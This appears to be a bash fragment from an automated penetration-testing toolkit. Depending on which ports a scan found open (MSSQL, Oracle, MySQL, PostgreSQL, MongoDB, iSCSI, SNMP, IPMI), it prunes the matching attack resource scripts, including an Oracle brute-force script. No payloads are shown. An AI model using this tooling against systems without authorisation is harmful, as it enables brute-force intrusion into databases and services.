if [ ! -f $BASE_DIR/clear/P1433.txt ]; then
	rm -rf $BASE_DIR/resource/mssql.rc $BASE_DIR/resource/dirtree.rc
	echo "$(tput setaf 2)$(tput bold)mssql yok"
fi

if [ ! -f $BASE_DIR/clear/P1521.txt ]; then
	rm -rf $BASE_DIR/resource/oraclebrute.sh $BASE_DIR/resource/oraclesid.rc $BASE_DIR/resource/oracletns.rc
	echo "$(tput setaf 2)$(tput bold)oracle yok"
fi

if [ ! -f $BASE_DIR/clear/P3306.txt ]; then
	rm -rf $BASE_DIR/resource/mysql.rc
	echo "$(tput setaf 2)$(tput bold)mysql yok"
fi

if [ ! -f $BASE_DIR/clear/P5432.txt ]; then
	rm -rf $BASE_DIR/resource/postgresql1.rc $BASE_DIR/resource/postgresql2.rc $BASE_DIR/resource/postgresql3.rc
	echo "$(tput setaf 2)$(tput bold)postgresql yok"
fi

if [ ! -f $BASE_DIR/clear/P27017.txt ]; then
	rm -rf $BASE_DIR/resource/mongodb1.rc $BASE_DIR/resource/mongodb2.rc $BASE_DIR/resource/mongodb3.rc
	echo "$(tput setaf 2)$(tput bold)mongodb yok"
fi

if [ ! -f $BASE_DIR/clear/P3260.txt ]; then
	rm -rf $BASE_DIR/resource/iscsi.sh
	echo "$(tput setaf 2)$(tput bold)iscsi yok"
fi

if [ ! -f $BASE_DIR/clear/P161.txt ]; then
	rm -rf $BASE_DIR/resource/snmp.rc
	echo "$(tput setaf 2)$(tput bold)snmp yok"
fi

if [ ! -f $BASE_DIR/clear/P623.txt ]; then
	echo "$(tput setaf 2)$(tput bold)ipmi yok"
fi

